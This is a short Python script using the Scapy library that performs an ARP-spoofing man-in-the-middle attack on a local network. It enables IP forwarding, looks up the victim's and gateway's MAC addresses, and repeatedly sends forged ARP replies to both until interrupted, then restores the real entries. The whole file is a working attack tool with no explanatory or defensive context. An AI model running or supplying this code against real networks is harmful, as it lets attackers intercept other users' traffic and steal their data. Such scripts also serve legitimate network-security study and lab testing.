#!/usr/bin/python3

from scapy.all import *
import sys
import os
import time

def help():

	print("Usage python3 mitm.py -i <interface> -a <gateway-ip> -v <victim-ip>")


if ( len(sys.argv) < 6 ):
	help()
	sys.exit(1)

elif ( sys.argv[1] != "-i" ):
	help()
	sys.exit(1)
elif ( sys.argv[3] != "-a" ):
	help()
	sys.exit(1)
elif ( sys.argv[5] != "-v"):
	help()
	sys.exit(1)




try:
	interface = sys.argv[2]
	gateIP = sys.argv[4]
	victimIP = sys.argv[6]

except KeyboardInterrupt:
	print ("\n[*] User Requested Shutdown")
	print ("[*] Exiting...")
	sys.exit(1)


print ("MITM\n" + "Interface    " + sys.argv[2] + "\n" + "Gateway      " + sys.argv[4] + "\n" + "Target       " + sys.argv[6] + "\n")
print ("\nPRESS CTRL+C to exit and wait while restore\n")
print ("\n[+] Enabling IP Forwarding [+]\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():

	print ("\n[+] Restoring Target [+]\n")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print ("[-] Disabling IP Forwarding [-]\n")
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print ("[-] Shutting Down [-]\n")
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def mitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print ("[!] Couldn't Find Victim MAC Address [!]")
		print ("[!] Exiting [!]")
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print ("[!] Couldn't Find Gateway MAC Address [!]")
		print ("[!] Exiting [!]")
		sys.exit(1)
	print ("[+] Poisoning Target [+]")
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break
mitm()
